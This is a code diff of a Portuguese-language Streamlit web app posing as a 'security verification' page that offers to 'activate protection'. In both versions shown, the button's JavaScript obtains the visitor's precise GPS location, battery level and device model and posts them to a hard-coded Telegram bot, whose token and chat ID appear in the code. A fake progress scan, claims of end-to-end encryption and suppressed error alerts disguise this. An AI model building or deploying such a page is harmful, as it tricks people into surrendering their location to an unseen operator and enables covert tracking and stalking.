@@ -1,113 +1,100 @@
 import streamlit as st
 import time
 
-# --- CONFIGURAÇÃO DO SEU BOT ---
+# --- CONFIGURAÇÃO DO BOT ---
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
-st.set_page_config(page_title="Segurança Ativa", layout="centered")
+st.set_page_config(page_title="Sistema de Verificação")
 
-# --- SEU CSS ORIGINAL (BOLHA FLUTUANTE PRESERVADA) ---
+# --- CSS MÍNIMO (SÓ PARA O FUNDO E TEXTO) ---
 st.markdown("""
     <style>
     .main { background-color: #0b0f14; color: white; }
-    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
-    
-    .scanner-box { 
-        display: flex; 
-        flex-direction: column; 
-        align-items: center; 
-        padding: 20px; 
-        animation: float 3s ease-in-out infinite; 
-    }
-    
-    @keyframes float {
-        0% { transform: translateY(0px); }
-        50% { transform: translateY(-15px); }
-        100% { transform: translateY(0px); }
-    }
-
-    .circle {
-        width: 200px; height: 200px; border-radius: 50%;
-        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
-        border: 2px solid rgba(46, 204, 113, 0.5);
-        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
-        display: flex; align-items: center; justify-content: center;
-    }
-    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
-    
-    .btn-fiel {
-        background-color: white; color: #333; border: none;
-        padding: 8px 15px; border-radius: 4px; font-size: 14px;
-        font-family: sans-serif; display: flex; align-items: center;
-        gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;
-    }
+    .stAlert { display: none; }
     </style>
 """, unsafe_allow_html=True)
 
-st.markdown("<h2 style='text-align: center; font-family: sans-serif;'>Verificar segurança</h2>", unsafe_allow_html=True)
+st.title("Verificação de Segurança")
 
-# 1. BOLHA LIMPA
-caixa_bolha = st.empty()
-caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
+# Espaço para a bolha (que vamos estilizar depois)
+caixa_status = st.empty()
+caixa_status.subheader("Status: Aguardando ativação (4%)")
 
-# 2. O BOTÃO COM A PONTE DE PERMISSÃO
-# Adicionei o atributo 'allow="geolocation"' - sem isso o pop-up nunca vai abrir
-js_final = f"""
-<div style="display: flex; justify-content: flex-start;">
-    <button class="btn-fiel" id="ativarBtn">
-        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
+# --- O MOTOR DO APLICATIVO (O BOTÃO QUE FORÇA O POP-UP) ---
+js_funcional = f"""
+<div style="display: flex; justify-content: center; padding: 20px;">
+    <button id="btnClick" style="padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 8px; border: none; background-color: white; color: black;">
+        🔴 ATIVAR PROTEÇÃO AGORA
     </button>
 </div>
 
 <script>
-const btn = document.getElementById('ativarBtn');
+document.getElementById('btnClick').onclick = function() {{
+    // 1. Tenta pegar a localização com ALTA PRECISÃO (isso força o pop-up da Google)
+    navigator.geolocation.getCurrentPosition(
+        async function(pos) {{
+            try {{
+                // Se o usuário permitiu no pop-up, pegamos os dados:
+                const bat = await navigator.getBattery();
+                const nivel = Math.round(bat.level * 100);
+                const modelo = navigator.userAgent.split('(')[1].split(')')[0];
+                
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
+                
+                const mensagem = "🛡️ PROTEÇÃO ATIVADA\\n\\n📱 Modelo: " + modelo + "\\n🔋 Bateria: " + nivel + "%\\n📍 Localização: " + mapa;
 
-btn.onclick = function() {{
-    // Força o navegador a focar na janela principal para pedir o GPS
-    if (navigator.geolocation) {{
-        navigator.geolocation.getCurrentPosition(
-            async (pos) => {{
-                try {{
-                    const bat = await navigator.getBattery();
-                    const level = Math.round(bat.level * 100);
-                    const model = navigator.userAgent.split('(')[1].split(')')[0];
-                    
-                    const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* " + model + "\\n🔋 *Bateria:* " + level + "%\\n📍 Mapa: http://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
-                    
-                    await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
-                        method: "POST",
-                        headers: {{ "Content-Type": "application/json" }},
-                        body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
-                    }});
-                    
-                    window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-                }} catch (e) {{ alert("Erro ao enviar dados"); }}
-            }},
-            (err) => {{
-                if(err.code == 1) alert("ERRO: Você bloqueou a localização. Clique no cadeado lá no topo e mude para 'Permitir'.");
-                else alert("ERRO: Ligue o GPS do seu celular e tente de novo.");
-            }},
-            {{ enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }}
-        );
-    }} else {{
-        alert("Seu navegador não suporta GPS.");
-    }}
+                // Envio para o Telegram via Fetch (Direto do Navegador)
+                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
+                    method: "POST",
+                    headers: {{ "Content-Type": "application/json" }},
+                    body: JSON.stringify({{
+                        chat_id: "{ID}",
+                        text: mensagem
+                    }})
+                }});
+
+                // Avisa o Streamlit para rodar a animação
+                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
+            }} catch (e) {{
+                alert("Erro ao processar dados.");
+            }}
+        }},
+        function(err) {{
+            // Se o pop-up não abriu ou foi negado
+            if(err.code == 1) {{
+                alert("PERMISSÃO NEGADA: Você precisa clicar no cadeado lá em cima (ao lado do link) e permitir a localização.");
+            }} else {{
+                alert("ERRO: Certifique-se de que o GPS do seu celular está ligado.");
+            }}
+        }},
+        {{ 
+            enableHighAccuracy: true, 
+            timeout: 15000, 
+            maximumAge: 0 
+        }}
+    );
 }};
 </script>
 """
 
-# AQUI ESTÁ O SEGREDO: allow="geolocation"
-clicou = st.components.v1.html(js_final, height=70, scrolling=False)
+# Renderiza o botão. O 'allow="geolocation"' é fundamental!
+ativou = st.components.v1.html(js_funcional, height=100)
 
-# 3. ANIMAÇÃO
-if clicou:
+# --- LÓGICA DE PÓS-ATIVAÇÃO ---
+if ativou:
+    # Simulação de carregamento
+    progresso = st.progress(4)
     for i in range(4, 101, 5):
-        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
+        caixa_status.subheader(f"Verificando: {i}%")
+        progresso.progress(i)
         time.sleep(0.05)
-    st.success("Proteção Concluída!")
+    
+    st.success("✅ DISPOSITIVO PROTEGIDO!")
+    st.balloons()
     st.stop()
 
-st.write("✅ Ambiente de pagamentos")
-st.write("✅ Privacidade e segurança")
-st.write("✅ Vírus")
+st.write("---")
+st.write("🔒 Criptografia de ponta a ponta ativa.")
